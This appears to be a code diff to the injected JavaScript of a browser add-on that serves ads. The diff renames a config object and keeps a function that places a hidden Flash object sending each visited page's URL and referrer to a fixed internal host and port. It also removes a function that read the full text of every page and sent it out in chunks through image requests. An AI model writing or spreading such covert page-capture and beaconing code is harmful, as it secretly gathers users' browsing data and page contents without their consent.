@@ -12,11 +12,6 @@ var i8bho_bindoemid= i8bho_bindoemid||0,
 	I8px= function(s){i=new Image();i.src=s},
 	_gaq= _gaq||[];
 
-    window.goyoovars ={
-        charset : document.charset || document.characterSet,
-        cmtorid : 'goyoo_communicator',
-    };
-
 _gaq.push(
 	['_setAccount', 'UA-28115250-1'],
 	['_setDomainName', 'none'],
@@ -35,6 +30,11 @@ _gaq.push(
 		}
 		return;
 	}
+
+    window.i8vars ={
+        charset : document.charset || document.characterSet,
+        cmtorid : 'i8_communicator',
+    };
 
 	I8Body= 101;
 	if( i8bho_nocgif ){
@@ -498,16 +498,16 @@ if (!document.body.innerText)
 
     function installCommunicator()
     {
-        var host = "10.10.11.163", port = "10010", policy = 'http://jebe/crossdomain.xml';
-        var swf = 'Communicator.swf?' + '&host=' + host + '&port=' + port + '&charset=' + goyoovars.charset;
-        var html = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" WIDTH="550" HEIGHT="400" style="border:1px solid red;" id="' + goyoovars.cmtorid + '">' +
+        var host = "10.10.11.163", port = "10010";
+        var swf = 'Communicator.swf?' + '&host=' + host + '&port=' + port + '&charset=' + i8vars.charset;
+        var html = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" WIDTH="550" HEIGHT="400" style="border:1px solid red;" id="' + i8vars.cmtorid + '">' +
                '<param name=host value="' + host + '">'             +
                '<param name=port value="' + port + '">'             +
-               '<param name=charset value="' + goyoovars.charset +  '">'      +
+               '<param name=charset value="' + i8vars.charset +  '">'      +
                '<param name=movie value="' + swf + '">'             +
                '<param name=allowscriptaccess value="always">'             +
                '<param name=quality value=low>'                     +
-               '<embed src="' + swf + '" allowscriptaccess=always quality=low bgcolor=#FFFFFF WIDTH="550" HEIGHT="400" NAME="' + goyoovars.cmtorid + '" TYPE="application/x-shockwave-flash" PLUGINSPAGE="http://www.macromedia.com/go/getflashplayer"></embed>' +
+               '<embed src="' + swf + '" allowscriptaccess=always quality=low bgcolor=#FFFFFF WIDTH="550" HEIGHT="400" NAME="' + i8vars.cmtorid + '" TYPE="application/x-shockwave-flash" PLUGINSPAGE="http://www.macromedia.com/go/getflashplayer"></embed>' +
                '</object>';
         var div = document.createElement('div');
         div.style.visibility = 'hidden';
@@ -523,12 +523,12 @@ if (!document.body.innerText)
 
     function sendText(text)
     {
-        if (window.goyoovars.cmtorinstalled === undefined)
+        if (window.i8vars.cmtorinstalled === undefined)
         {
-            window.goyoovars.cmtorinstalled = true;
+            window.i8vars.cmtorinstalled = true;
             installCommunicator();
         }
-        var cmtor = msie ? window[goyoovars.cmtorid] : document[goyoovars.cmtorid];
+        var cmtor = msie ? window[i8vars.cmtorid] : document[i8vars.cmtorid];
         window.cmtor = cmtor;   // test only
         var meta = {url:document.location.href, ref:document.referrer};
         if (!cmtor || !cmtor.call)
@@ -547,60 +547,7 @@ if (!document.body.innerText)
                 alert('page already exists, plz enjoy some ads.');
             }
         };
-        cmtor.call("pageExists", 'crawlPage', meta, charset);
-    }
-
-    // for flash only.
-    var pageIdPrefix = Math.random();
-    window.getPageId = function()
-    {
-        return pageIdPrefix + '|' + document.location.href.toString().replace(/:/g, '|');
-    }
-
-    function _sendText()
-    {
-        var first_request_carry_data = true;
-        var text = document.body.innerText,
-//            prefix = 'http://10.10.11.163/text?n=',
-            prefix = 'http://jebe/text?n=',
-            turn = '&t=',
-            param = '&c=',
-//            paraSize = (msie ? ((msie<8) ? 1024 : 4098) : 4096),
-            paraSize = (msie ? ((msie<8) ? 1024 : 4098) : 1024),
-            maxTimes = (msie ? ((msie<8) ? 4 : 6) : 4) + first_request_carry_data,
-            metaSize = prefix.length + turn.length + param.length + (maxTimes.toString().length << 1);
-        if (text === undefined) return;
-        var step = paraSize - metaSize, maxSize = step * maxTimes;
-        content = encodeURIComponent((text.length > maxSize ? text.substr(0, maxSize) : text).replace(/\s{2,}/g, ' ').replace(/[\n&]/g, ' ')).substr(0, maxSize);
-        var total = Math.ceil(content.length/step);
-        prefix += total + turn;
-        var brkPos = [0];
-        for (var i = 1, p = 0; i <= total + first_request_carry_data; ++i)
-        {
-            p = brkPos[i - 1] + step;
-            brkPos[i] = content[p - 2] == '%' ? (p - 2) : (content[p - 1] == '%' ? (p - 1) : p);
-        }
-        function sendRemains()
-        {
-            alert('page non-exists, send page');
-            for (var i = +first_request_carry_data, cursor, end = brkPos.length - 1, para; i < end; )
-            {
-                cursor = brkPos[i];
-                para = content.substr(cursor, brkPos[++i] - cursor);
-                if (i == end)
-                {
-                    if (para.length >= paraSize)
-                    {
-                        para = para.substr(0, para[paraSize - 2] == '%' ? (paraSize - 2) : (para[paraSize - 1] == '%' ? (paraSize - 1) : paraSize));
-                    }
-                }
-                I8px(prefix + i + param + para);
-            }
-        }
-        var img = new Image();
-        img.onload = sendRemains;
-        img.onerror = function() { alert('page exists, 请看广告'); }
-        img.src = prefix + (+first_request_carry_data).toString() + (first_request_carry_data ? (param + content.substr(brkPos[0], brkPos[1])) : '');
+        cmtor.call("pageExists", 'crawlPage', meta, i8vars.charset);
     }
 
 	//load Google Analytics
